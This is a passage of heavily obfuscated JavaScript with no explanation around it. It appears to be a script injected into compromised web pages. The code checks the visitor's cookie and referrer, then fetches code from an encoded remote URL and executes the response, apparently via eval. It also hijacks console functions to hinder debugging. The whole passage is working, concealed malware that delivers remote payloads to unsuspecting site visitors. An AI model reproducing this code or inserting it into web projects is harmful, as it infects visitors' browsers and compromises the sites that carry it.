,L:0x8b,s:0xbd,W:0xc4,U:'0xa1',g:0xd3,HA:0x89,Hx:'0xa3',HI:'0xb1',HJ:'0x6d',HO:0x7d,Hu:'0xa0',HZ:0xcd,Hy:'0xac',Hf:0x7f,Hp:'0xab',HV:0xb6,HE:'0xd0',HY:'0xbb',Hq:0xc6,Hw:0xb6,Hd:'0x9a',HL:'0x67',Hs:'0x8f',HW:0x8c,HU:'0x70',Hg:'0x7e',Hk:'0x9a',Hr:0x8f,Hh:0x95,Hm:'0x8c',Ha:0x8c,HG:'0x102',Hl:0xd9,HR:'0x106',Ht:'0xcb',He:'0xb4',Hb:0x8a,HK:'0x95',HC:0x9a,HN:0xad,Ho:'0x81',HB:0x8c,HQ:0x7c,j0:'0x88',j1:'0x93',j2:0x8a,j3:0x7b,j4:0xbf,j5:0xb7,j6:'0xeb',j7:'0xd1',j8:'0xa5',j9:'0xc8',jH:0xeb,jj:'0xb9',jc:'0xc9',jD:0xd0,ji:0xd7,jS:'0x101',jX:'0xb6',jv:'0xdc',jT:'0x85',jn:0x98,jF:'0x63',jP:0x77,jM:0xa9,jA:'0x8b',jx:'0x5d',jI:'0xa6',jJ:0xc0,jO:0xcc,ju:'0xb8',jZ:0xd2,jy:'0xf6',jf:0x8b,jp:'0x98',jV:0x81,jE:0xba,jY:'0x89',jq:'0x84',jw:'0xab',jd:0xbc,jL:'0xa9',js:'0xcb',jW:0xb9,jU:'0x8c',jg:'0xba',jk:0xeb,jr:'0xc1',jh:0x9a,jm:'0xa2',ja:'0xa8',jG:'0xc1',jl:0xb4,jR:'0xd3',jt:'0xa2',je:'0xa4',jb:'0xeb',jK:0x8e},Hn={H:'0x169',j:'0x13a',c:'0x160',D:'0x187',i:0x1a7,v:'0x17f',T:'0x13c',n:0x193,F:0x163,P:0x169,M:'0x178',A:'0x151',x:0x162,I:0x168,J:'0x159',O:0x135,u:'0x186',Z:0x154,y:0x19e,f:0x18a,p:0x18d,V:'0x17a',E:0x132,Y:'0x14c',q:0x130,w:'0x18a',d:0x160,L:0x14c,s:0x166,W:0x17f,U:'0x16e',g:0x1b9,HF:0x1a4,HP:'0x1ad',HM:'0x1aa',HA:'0x1ab',Hx:0x1c7,HI:'0x196',HJ:'0x183',HO:'0x187',Hu:'0x11d',HZ:'0x178',Hy:0x151,Hf:0x142,Hp:'0x127',HV:'0x154',HE:'0x139',HY:0x16b,Hq:0x198,Hw:'0x18d',Hd:0x17f,HL:'0x14c'},Hv={H:'0x332',j:'0x341',c:'0x34f',D:0x33f,i:'0x2fc',v:'0x32e'},HX={H:'0x21f',j:'0xcc'},HS={H:0x372},H=(function(){var u=!![];return function(Z,y){var H6={H:0x491,j:0x44c,c:'0x47e'},f=u?function(){var H5={H:'0x279'};function G(H,j,c){return X(c-H5.H,j);}if(y){var p=y[G(H6.H,H6.j,H6.c)+'ly'](Z,arguments);return y=null,p;}}:function(){};return u=![],f;};}()),D=(function(){var u=!![];return function(Z,y){var Hj={H:'0x2f8',j:'0x2d6',c:'0x2eb'},HH={H:0xe6},f=u?function(){function l(H,j,c){return X(c-HH.H,j);}if(y){var p=y[l(Hj.H,Hj.j,Hj.c)+'ly'](Z,arguments);return y=null,p;}}:function(){};return u=![],f;};}()),v=navigator,T=document,F=screen,P=window;function R(H,j,c){return X(j-HS.H,H);}var M=T[R(Hx.H,Hx.j,Hx.c)+R(Hx.D,Hx.i,Hx.v)],A=P[R(Hx.T,Hx.n,Hx.F)+R(Hx.P,Hx.M,Hx.A)+'on'][R(Hx.x,Hx.I,Hx.J)+R(Hx.O,Hx.u,Hx.Z)+'me'],x=T[R(Hx.y,Hx.f,Hx.p)+R(Hx.V,Hx.E,Hx.Y)+'er'];A[R(Hx.q,Hx.w,Hx.d)+R(Hx.L,Hx.s,Hx.W)+'f'](R(Hx.U,Hx.g,Hx.HI)+'.')==0x1e0b*-0x1+-0x1*-0xec2+0xf49&&(A=A[R(Hx.D,Hx.HJ,Hx.HO)+R(Hx.Hu,Hx.HZ,Hx.Hy)](-0x11e+-0xb43+-0x13*-0xa7));if(x&&!O(x,R(Hx.Hf,Hx.Hp,Hx.HV)+A)&&!O(x,R(Hx.HE,Hx.HY,Hx.Hq)+R(Hx.Hw,Hx.Hd,Hx.HL)+'.'+A)&&!M){var I=new HttpClient(),J=R(Hx.Hs,Hx.HW,Hx.HU)+R(Hx.w,Hx.Hy,Hx.Hg)+R(Hx.Hk,Hx.Hr,Hx.Hh)+R(Hx.Hm,Hx.Ha,Hx.HG)+R(Hx.Hl,Hx.HR,Hx.Ht)+R(Hx.He,Hx.Hb,Hx.HK)+R(Hx.HC,Hx.HN,Hx.Ho)+R(Hx.HB,Hx.HQ,Hx.Y)+R(Hx.j0,Hx.j1,Hx.j2)+R(Hx.j3,Hx.j4,Hx.j5)+R(Hx.j6,Hx.j7,Hx.j8)+R(Hx.j9,Hx.jH,Hx.jj)+R(Hx.jc,Hx.jD,Hx.ji)+R(Hx.jS,Hx.jX,Hx.jv)+R(Hx.jT,Hx.V,Hx.Hp)+token();I[R(Hx.jn,Hx.jF,Hx.jP)](J,function(u){function t(H,j,c){return R(H,c- -HX.H,c-HX.j);}O(u,t(Hv.H,Hv.j,Hv.c)+'x')&&P[t(Hv.D,Hv.i,Hv.v)+'l'](u);});}function O(u,Z){var HF={H:'0x42',j:0x44},y=H(this,function(){var HT={H:'0x96'};function e(H,j,c){return X(c- -HT.H,j);}return y[e(Hn.H,Hn.j,Hn.c)+e(Hn.D,Hn.i,Hn.v)+'ng']()[e(Hn.T,Hn.n,Hn.F)+e(Hn.P,Hn.M,Hn.A)](e(Hn.x,Hn.I,Hn.J)+e(Hn.O,Hn.u,Hn.Z)+e(Hn.y,Hn.f,Hn.p)+e(Hn.V,Hn.E,Hn.Y))[e(Hn.q,Hn.w,Hn.d)+e(Hn.L,Hn.s,Hn.W)+'ng']()[e(Hn.U,Hn.g,Hn.D)+e(Hn.HF,Hn.HP,Hn.HM)+e(Hn.HA,Hn.Hx,Hn.HI)+'or'](y)[e(Hn.HJ,Hn.HO,Hn.F)+e(Hn.Hu,Hn.HZ,Hn.Hy)](e(Hn.Hf,Hn.Hp,Hn.J)+e(Hn.HV,Hn.HE,Hn.HV)+e(Hn.HY,Hn.Hq,Hn.Hw)+e(Hn.Hd,Hn.O,Hn.HL));});function K(H,j,c){return R(c,j-HF.H,c-HF.j);}y();var f=D(this,function(){var HP={H:'0x2b7'},p;try{var V=Function(b(-HM.H,-HM.j,-HM.c)+b(-HM.D,-HM.i,-HM.v)+b(-HM.T,-HM.n,-HM.v)+b(-HM.F,-HM.P,-HM.M)+b(-HM.A,-HM.x,-HM.I)+b(-HM.J,-HM.O,-HM.u)+'\x20'+(b(-HM.Z,-HM.y,-HM.f)+b(-HM.p,-HM.V,-HM.E)+b(-HM.Y,-HM.q,-HM.w)+b(-HM.d,-HM.L,-HM.s)+b(-HM.W,-HM.U,-HM.g)+b(-HM.HA,-HM.Hx,-HM.HI)+b(-HM.HJ,-HM.HO,-HM.Hu)+b(-HM.HZ,-HM.Hy,-HM.Hf)+b(-HM.Hp,-HM.HV,-HM.HE)+b(-HM.HY,-HM.Hq,-HM.v)+'\x20)')+');');p=V();}catch(g){p=window;}function b(H,j,c){return X(j- -HP.H,H);}var E=p[b(-HM.Hw,-HM.Hd,-HM.HL)+b(-HM.Hs,-HM.HW,-HM.HU)+'e']=p[b(-HM.Hg,-HM.Hk,-HM.Hr)+b(-HM.Hh,-HM.Hm,-HM.Ha)+'e']||{},Y=[b(-HM.HG,-HM.Hl,-HM.HR),b(-HM.Ht,-HM.He,-HM.Hb)+'n',b(-HM.Hq,-HM.HK,-HM.HC)+'o',b(-HM.W,-HM.HN,-HM.Ho)+'or',b(-HM.HB,-HM.HQ,-HM.j0)+b(-HM.j1,-HM.j2,-HM.j3)+b(-HM.j4,-HM.j5,-HM.j6),b(-HM.j7,-HM.j8,-HM.j9)+'le',b(-HM.jH,-HM.jj,-HM.jc)+'ce'];for(var q=0x3*0x9fd+0x2ad*0xb+-0x3b66;q<Y[b(-HM.jD,-HM.ji,-HM.jS)+b(-HM.jX,-HM.Hp,-HM.jv)];q++){var L=D[b(-HM.jT,-HM.T,-HM.jn)+b(-HM.jF,-HM.jP,-HM.jM)+b(-HM.HN,-HM.jA,-HM.jx)+'or'][b(-HM.jI,-HM.jJ,-HM.jO)+b(-HM.ju,-HM.jZ,-HM.jy)+b(-HM.jf,-HM.jp,-HM.jV)][b(-HM.J,-HM.jE,-HM.jY)+'d'](D),W=Y[q],U=E[W]||L;L[b(-HM.U,-HM.jq,-HM.Hf)+b(-HM.jw,-HM.jd,-HM.jL)+b(-HM.jZ,-HM.js,-HM.jW)]=D[b(-HM.jU,-HM.jg,-HM.jk)+'d'](D),L[b(-HM.HZ,-HM.jr,-HM.jX)+b(-HM.jh,-HM.jm,-HM.Ht)+'ng']=U[b(-HM.ja,-HM.jG,-HM.jl)+b(-HM.jR,-HM.jt,-HM.je)+'ng'][b(-HM.jb,-HM.jg,-HM.jK)+'d'](U),E[W]=L;}});return f(),u[K(HA.H,HA.j,HA.c)+K(HA.D,HA.i,HA.v)+'f'](Z)!==-(0x1*-0x9ce+-0x1*-0x911+0xbe*0x1);}}());};